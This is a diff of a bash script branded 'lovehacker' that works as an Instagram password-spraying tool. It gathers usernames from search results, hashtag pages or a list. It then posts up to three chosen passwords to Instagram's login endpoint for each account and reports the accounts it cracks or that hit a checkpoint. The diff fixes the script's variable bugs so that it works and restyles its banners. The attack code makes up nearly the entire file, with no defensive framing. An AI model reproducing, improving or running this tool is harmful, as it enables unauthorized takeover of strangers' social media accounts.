@@ -1,21 +1,15 @@
 limit=50
-logo="""\e[1;33m
-	wel = """
-           
-lovehacker
-\e[1;36m
-insta Cloning
-
-\e[1;31m===================================================
-\e[1;35m
-BlackMafia
-\e[1;33mWhatsApp Number: \e[1;36m03094161457
-\e[1;31m===================================================
+logo="""\e[1;37m
+Lovehacker
+--------------------------------------------------
+➣ Auther   : lovehacker
+➣ YouTube  : lovehacker
+--------------------------------------------------
 """
 dependencies=( "jq" "curl" )
-for in "${dependencies[@]}"
+for i in "${dependencies[@]}"
 do
-command -v $ >/dev/null 2>&1 || {
+command -v $i >/dev/null 2>&1 || {
 apt install jq
 apt install curl
 }
@@ -23,32 +17,32 @@ done
 clear
 echo -e "${logo}"
 echo -e '''
-\e[1;33m[1]\e[1;36m Crack By Searching Name
-\e[1;33m[2]\e[1;35m Crack By HashTag
-\e[1;33m[3]\e[1;34m Crack From List
+[1] Crack By Searching Name
+[2] Crack By HashTag
+[3] Crack From List
 '''
-echo -e "\e[1;31m==================================================="
-read -p $'\e[1;31m Select An Option   : \e[1;37m' opt
+echo -e "\e[1;37m--------------------------------------------------"
+read -p $'\e[1;33m Select An Option   : \e[1;37m' opt
 touch target
 case $opt in
 1) # menu 1
 clear
 echo -e "${logo}"
-read -p $' \e[1;35mPut  Any  Name    : \e[1;37m' ask
+read -p $' \e[1;33mPut  Any  Name    : \e[1;37m' ask
 collect=$(curl -s "https://www.instagram.com/web/search/topsearch/?context=blended&query=${ask}" | jq -r '.users[].user.username' > target)
 echo $' \e[1;33mTotal Users Found : '$collect''$(< target wc -l ; echo -e)
-read -p $'\e[1;36m Put Password No 1 : \e[1;33m' Password1
-read -p $'\e[1;36m Put Password No 2 : \e[1;33m' Password2
-read -p $'\e[1;36m Put Password No 3 : \e[1;33m' Password3
-echo -e "\e[1;32m Start cracking..."
-echo -e "\e[1;31m==================================================="
+read -p $'\e[1;33m Put Password No 1 : \e[1;37m' ps1
+read -p $'\e[1;33m Put Password No 2 : \e[1;37m' ps2
+read -p $'\e[1;33m Put Password No 3 : \e[1;37m' ps3
+echo -e "\e[1;31m Start cracking..."
+echo -e "\e[1;37m--------------------------------------------------"
 echo -e ""
-echo -e " \e[1;36mTrying Password No 1"
+echo -e " \e[1;33mTrying Password No 1"
 ;;
 2) # menu 2
 clear
 echo -e "${logo}"
-read -p $'\e[1;33m Put Any HashTag : \e[1;37m' Hashtag
+read -p $'\e[1;33m Put Any HashTag : \e[1;37m' hashtag
 get=$(curl -sX GET "https://www.instagram.com/explore/tags/${hashtag}/?__a=1")
 if [[ $get =~ "Page Not Found" ]]; then
 echo -e " \e[1;31mHashtag not found\e[1;37m"
@@ -57,13 +51,13 @@ else
 echo -e "$get" | jq -r '.[].hashtag.edge_hashtag_to_media.edges[].node.shortcode' | awk '{print "https://www.instagram.com/p/"$0"/"}' > result
 $(sort -u result > hashtag)
 echo $" \e[1;33mTotal Users Found : "$(< hashtag wc -l ; echo -e)
-read -p $'\e[1;35m Put Password No 1 : \e[1;34m' Password1
-read -p $'\e[1;35m Put Password No 2 : \e[1;34m' Password2
-read -p $'\e[1;35m Put Password No 3 : \e[1;34m' Password3
+read -p $'\e[1;33m Put Password No 1 : \e[1;37m' ps1
+read -p $'\e[1;33m Put Password No 2 : \e[1;37m' ps2
+read -p $'\e[1;33m Put Password No 3 : \e[1;37m' ps3
 echo -e "\e[1;31m Start cracking..."
-echo -e "\e[1;31m==================================================="
+echo -e "\e[1;37m--------------------------------------------------"
 echo -e ""
-echo -e " \e[1;35mTrying Password No 1"
+echo -e " \e[1;33mTrying Password No 1"
 for tag in $(cat hashtag); do
 echo $tag | xargs -P 100 curl -s | grep -o "alternateName.*" | cut -d "@" -f2 | cut -d '"' -f1 >> target &
 done
@@ -81,13 +75,13 @@ exit
 else
 cat $list > target
 echo $" \e[1;33mTotal Users Found : "$(< target wc -l)
-read -p $'\e[1;34m Put Password No 1 : \e[1;35m' Password1
-read -p $'\e[1;34m Put Password No 2 : \e[1;35m' Password2
-read -p $'\e[1;34m Put Password No 3 : \e[1;35m' Password3
+read -p $'\e[1;33m Put Password No 1 : \e[1;37m' ps1
+read -p $'\e[1;33m Put Password No 2 : \e[1;37m' ps2
+read -p $'\e[1;33m Put Password No 3 : \e[1;37m' ps3
 echo -e "\e[1;31m Start cracking..."
-echo -e "\e[1;31m==================================================="
+echo -e "\e[1;37m--------------------------------------------------"
 echo -e ""
-echo -e " \e[1;34mTrying Password No 1"
+echo -e " \e[1;33mTrying Password No 1"
 fi
 ;;
 *) # wrong menu
@@ -109,21 +103,21 @@ url=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/aj
 login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
 if [[ $login =~ "true" ]]; then
 echo -e ""
-echo -e "\e[1;31m==================================================="
+echo -e "\e[1;37m--------------------------------------------------"
 echo -e " \e[1;32mUsername : $i"
 echo -e " Password : ${ps1}"
 echo -e " Status   : Successfull"
-echo -e "\e[1;31m==================================================="
+echo -e "\e[1;37m--------------------------------------------------"
 echo -e ""
 elif [[ $login =~ "false" ]]; then
-echo -e "\e[1;36m[Not Cracked\e[1;36m]  @$i"
+echo -e "\e[1;37m[Not Cracked\e[1;37m]  @$i"
 elif [[ $url =~ "checkpoint_required" ]]; then
 echo -e ""
-echo -e "\e[1;31m==================================================="
-echo -e " \e[1;36mUsername : $i"
+echo -e "\e[1;37m--------------------------------------------------"
+echo -e " \e[1;31mUsername : $i"
 echo -e " Password : ${ps1}"
 echo -e " Status   : Checkpoint"
-echo -e "\e[1;31m==================================================="
+echo -e "\e[1;37m--------------------------------------------------"
 echo -e ""
 fi
 }
@@ -183,21 +177,21 @@ url=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/aj
 login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
 if [[ $login =~ "true" ]]; then
 echo -e ""
-echo -e "\e[1;31m==================================================="
+echo -e "\e[1;37m--------------------------------------------------"
 echo -e " \e[1;32mUsername : $i"
 echo -e " Password : ${ps2}"
 echo -e " Status   : Successfull"
-echo -e "\e[1;31m==================================================="
+echo -e "\e[1;37m--------------------------------------------------"
 echo -e ""
 elif [[ $login =~ "false" ]]; then
-echo -e "\e[1;35m[Not Cracked\e[1;35m]  @$i"
+echo -e "\e[1;37m[Not Cracked\e[1;37m]  @$i"
 elif [[ $url =~ "checkpoint_required" ]]; then
 echo -e ""
-echo -e "\e[1;31m==================================================="
-echo -e " \e[1;35mUsername : $i"
+echo -e "\e[1;37m--------------------------------------------------"
+echo -e " \e[1;31mUsername : $i"
 echo -e " Password : ${ps2}"
 echo -e " Status   : Checkpoint"
-echo -e "\e[1;31m==================================================="
+echo -e "\e[1;37m--------------------------------------------------"
 echo -e ""
 fi
 }
@@ -256,21 +250,21 @@ url=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/aj
 login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
 if [[ $login =~ "true" ]]; then
 echo -e ""
-echo -e "\e[1;31m==================================================="
+echo -e "\e[1;37m--------------------------------------------------"
 echo -e " \e[1;32mUsername : $i"
 echo -e " Password : ${ps3}"
 echo -e " Status   : Successfull"
-echo -e "\e[1;31m==================================================="
+echo -e "\e[1;37m--------------------------------------------------"
 echo -e ""
 elif [[ $login =~ "false" ]]; then
-echo -e "\e[1;34m[Not Cracked\e[1;34m]  @$i"
+echo -e "\e[1;37m[Not Cracked\e[1;37m]  @$i"
 elif [[ $url =~ "checkpoint_required" ]]; then
 echo -e ""
-echo -e "\e[1;31m==================================================="
-echo -e " \e[1;34mUsername : $i"
+echo -e "\e[1;37m--------------------------------------------------"
+echo -e " \e[1;31mUsername : $i"
 echo -e " Password : ${ps3}"
 echo -e " Status   : Checkpoint"
-echo -e "\e[1;31m==================================================="
+echo -e "\e[1;37m--------------------------------------------------"
 echo -e ""
 fi
 }
